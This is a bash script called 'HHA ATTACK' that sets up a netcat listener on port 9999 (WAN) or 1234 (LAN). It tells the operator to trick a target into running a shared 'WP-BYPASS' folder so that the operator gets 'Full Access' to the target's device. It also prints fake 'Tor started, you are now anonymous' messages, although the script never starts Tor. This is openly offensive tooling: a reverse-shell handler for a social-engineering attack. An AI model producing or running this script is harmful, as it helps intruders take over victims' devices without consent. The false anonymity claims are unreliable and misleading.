#!/usr/bin/env bash
red="\e[0;91m"
blue="\e[0;94m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
uline="\e[4m"
reset="\e[0m"
clear
sleep 2
echo -e "${green}[+] Starting ${red}${bold}Tor${green} server...${reset}"
sleep 2
echo -e "${green}[+] Started ${red}${bold}Anonym0us${green} server...${reset}"
sleep 2
echo -e "${green}[+] You Are Now ${red}${bold}Anonym0us${reset}"
sleep 2
clear

banner () {
    toilet -f future "HHA ATTACK"
    echo -e "       $green CoDeD By ${red}${bold}Anonym0us R47${reset}"
}


wan() {
  clear
  toilet -f future "WAN"
  echo -e "${red}${bold}HHA ATTACK${reset}"
  echo -e "${green}CoDeD By ${red}${bold}Anonym0us R47${reset}"
  sleep 0.5
  apt install git
  apt install netcat
  clear
  toilet -f future "WAN"
  echo -e "${red}${bold}HHA ATTACK${reset}"
  echo -e "${green}CoDeD By ${red}${bold}Anonym0us R47${reset}"
  echo -e "${green}[i]${red} Share WP-BYPASS Folder To Target and Target Run That Tool To get Full Access To That Target Device${reset}"
  echo -e "${red}[!]${green} Dont Stop this ${reset}"
  nc -nlvp 9999

}
lan() {
  clear
  toilet -f future "LAN"
  echo -e "${red}${bold}HHA ATTACK${reset}"
  echo -e "${green}CoDeD By ${red}${bold}Anonym0us R47${reset}"
  sleep 0.5
  apt install git
  apt install netcat
  clear
  toilet -f future "LAN"
  echo -e "${red}${bold}HHA ATTACK${reset}"
  echo -e "${green}CoDeD By ${red}${bold}Anonym0us R47${reset}"
  echo -e "${green}[i]${red} Share ${green}WP-BYPASSL ${red}Folder To Target and Target Run That Tool To get Full Access To That Target Device${reset}"
  echo -e "${red}[!]${green} Dont Stop this ${reset}"
  nc -nlvp 1234

}
menu() {
  echo "[01] WAN"
  echo "[02] LAN"
  printf $green
  read  -p "[+] Enter Option: " op1
  sleep 1
  printf $reset
  if [[ $op1 == 1 || $op1 == 01 ]]; then
    wan
  elif [[ $op1 == 2 || $op1 == 02 ]]; then
    lan
  else
    echo -e "${red}[-] Enter valid Option...!${reset}"
    clear
    banner
    menu
fi
}
banner
menu
